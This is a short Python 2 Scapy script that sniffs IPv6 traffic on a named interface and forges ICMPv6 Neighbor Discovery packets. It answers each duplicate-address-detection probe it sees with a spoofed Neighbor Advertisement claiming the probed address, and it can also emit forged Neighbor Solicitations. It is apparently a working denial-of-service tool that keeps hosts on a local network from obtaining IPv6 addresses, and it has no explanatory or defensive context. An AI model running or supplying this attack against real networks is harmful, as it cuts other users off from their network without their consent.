# coding:utf-8
#! /usr/bin/env python
from scapy.all import *

ifaceName = "enp0s31f6"

globalSrcAddr = "2001:db8:0:1:c0bc:a2a0:21d6:6a0b"
globalDstAddr = "ff02::1"

linkSrcAddr = "fe80::437f:2137:3e16:b6ea"
linkDstAddr = "ff02::1"



def ipv6_monitor_callback(pkt):
    if IPv6 in pkt:
        if ICMPv6ND_NS in pkt:
            if pkt[IPv6].src == "::":
                print "ether src:",pkt[Ether].src
                print "ether dst:",pkt[Ether].dst
                print "ipv6 src:",pkt[IPv6].src
                print "ipv6 dst:",pkt[IPv6].dst
                target_address = pkt[ICMPv6ND_NS].tgt
                print "target address:",target_address
                forge_na_pkt(target_address)
                #forge_ns_pkt(target_address)

def send_ns_pkt(pkt):
    forge_ns_pkt(linkSrcAddr)

def forge_ns_pkt(target_address):
    ether=Ether(src='8c:ec:4b:73:25:8d',dst='33:33:ff:e4:89:00')
    a=IPv6(src="::", dst='ff02::1:ff21:41f')
    b=ICMPv6ND_NS(tgt=target_address)
    print "send NS packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName)    

def forge_na_pkt(target_address):
    segment = target_address.split(":")
    if segment[0]== "fe80":
        print target_address
        return
    ether=Ether(src='8c:ec:4b:73:25:8d',dst='33:33:00:00:00:01')
    # ******* LinkLocal Address Forge ************** #
    #a=IPv6(src=linkSrcAddr, dst=linkDstAddr)
    a=IPv6(src=target_address, dst=linkDstAddr)
    # ********** Global Address Forge ************** #
    #a=IPv6(src=globalSrcAddr, dst=globalDstAddr)
    #a=IPv6(src=target_address, dst=globalDstAddr)

    b=ICMPv6ND_NA(tgt=target_address)
    print "send NA packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName)

if __name__ == "__main__":
    #sniff(filter="ip6",prn=ipv6_monitor_callback,iface=ifaceName,count=1)
    sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=3)
